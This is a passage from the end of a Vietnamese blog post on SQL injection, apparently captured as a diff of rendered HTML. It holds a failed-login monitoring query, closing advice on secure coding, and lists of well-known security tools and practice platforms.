+</span><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Monitor failed login attempts
+</span></span><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-support z-function z-aggregate z-sql">COUNT</span>(<span class="z-variable z-language z-star z-sql">*</span>) <span class="z-keyword z-other z-DML z-sql">FROM</span> auth_logs <span class="z-keyword z-other z-DML z-sql">WHERE</span> success <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-constant z-numeric z-sql">0</span> <span class="z-keyword z-operator z-logical z-sql">AND</span> <span class="z-storage z-type z-sql">timestamp</span> <span class="z-keyword z-operator z-comparison z-sql">&gt;</span> NOW<span class="z-meta z-block z-sql"><span class="z-punctuation z-section z-scope z-begin z-sql">(</span><span class="z-punctuation z-section z-scope z-end z-sql">)</span></span> <span class="z-keyword z-operator z-math z-sql">-</span> INTERVAL <span class="z-constant z-numeric z-sql">1</span> HOUR;
+</span></code></pre>
+<h2 id="ket-luan-sql-injection-ke-thu-cu-nhung-van-nguy-hiem">Kết Luận: "SQL Injection - Kẻ Thù Cũ Nhưng Vẫn Nguy Hiểm"<a class="zola-anchor" href="#ket-luan-sql-injection-ke-thu-cu-nhung-van-nguy-hiem" aria-label="Anchor link for: ket-luan-sql-injection-ke-thu-cu-nhung-van-nguy-hiem" style="visibility: hidden;"></a></h2>
+<p>SQL Injection giống như cảm cúm - ai cũng biết nhưng vẫn cứ bị mắc. Đây là vulnerability đã tồn tại hơn 20 năm nhưng vẫn xuất hiện trong hầu hết các ứng dụng web hiện đại.</p>
+<p><strong>Key takeaways:</strong></p>
+<ul>
+<li>SQL Injection không chỉ là technical issue mà còn là business risk</li>
+<li>Prevention tốt hơn cure - implement secure coding practices từ đầu</li>
+<li>Testing phải là continuous process, không phải one-time activity</li>
+<li>Education là chìa khóa - developer phải hiểu security fundamentals</li>
+</ul>
+<p><strong>Final wisdom:</strong>
+Trong thế giới cybersecurity, chỉ có hai loại tổ chức: những tổ chức đã bị hack và những tổ chức chưa biết mình đã bị hack. Đừng để SQL injection biến bạn thành loại thứ nhất.</p>
+<h2 id="resources-va-tools">Resources và Tools<a class="zola-anchor" href="#resources-va-tools" aria-label="Anchor link for: resources-va-tools" style="visibility: hidden;"></a></h2>
+<h3 id="learning-resources">Learning Resources:<a class="zola-anchor" href="#learning-resources" aria-label="Anchor link for: learning-resources" style="visibility: hidden;"></a></h3>
+<ul>
+<li><strong>OWASP SQL Injection Prevention Cheat Sheet</strong></li>
+<li><strong>PortSwigger Web Security Academy</strong></li>
+<li><strong>SQLi-labs</strong> - Hands-on practice</li>
+<li><strong>DVWA (Damn Vulnerable Web Application)</strong></li>
+</ul>
+<h3 id="essential-tools">Essential Tools:<a class="zola-anchor" href="#essential-tools" aria-label="Anchor link for: essential-tools" style="visibility: hidden;"></a></h3>
+<ul>
+<li><strong>SQLmap</strong> - Automated SQL injection exploitation</li>
+<li><strong>Burp Suite</strong> - Web application security testing</li>
+<li><strong>OWASP ZAP</strong> - Free security testing proxy</li>
+<li><strong>NoSQLMap</strong> - NoSQL injection testing</li>
+</ul>
+<h3 id="practice-platforms">Practice Platforms:<a class="zola-anchor" href="#practice-platforms" aria-label="Anchor link for: practice-platforms" style="visibility: hidden;"></a></h3>
+<ul>
+<li><strong>HackTheBox</strong></li>
+<li><strong>TryHackMe</strong></li>
+<li><strong>VulnHub</strong></li>
+<li><strong>OverTheWire</strong></li>
+</ul>
+<hr />
+<p><em>Remember: "With great power comes great responsibility" - Uncle Ben (và cả security professionals). Sử dụng kiến thức này để protect, không phải để attack.</em></p>
+<hr />
+
+      </article>
+
+      
+      
+
+      
+      
+    </div>
+
+    
+
+
+<footer>
+  <div class="left">
+    <div class="copyright">
+      © 2025 <a href="https:&#x2F;&#x2F;wen.is-a.dev">Wen</a>
+      
+    </div>
+  </div>
+
+  <div class="right">
+    
+    
+    
+    
+
+    <!-- 
+    
+    
+    <button id="theme-toggle" aria-label="theme switch">
+      <span class="moon-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill="currentColor"></path></svg>
+</span>
+      <span class="sun-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill="currentColor"></path></svg>
+</span>
+    </button>
+     -->
+  </div>
+</footer>
+
+
+
+
+  </main>
+</div>
+
+  
+<script src="/js/lightense.min.js"></script>
+
+
+
+  <script src="https://wen.is-a.dev/js/main.js"></script>
+</body>
+
+</html>
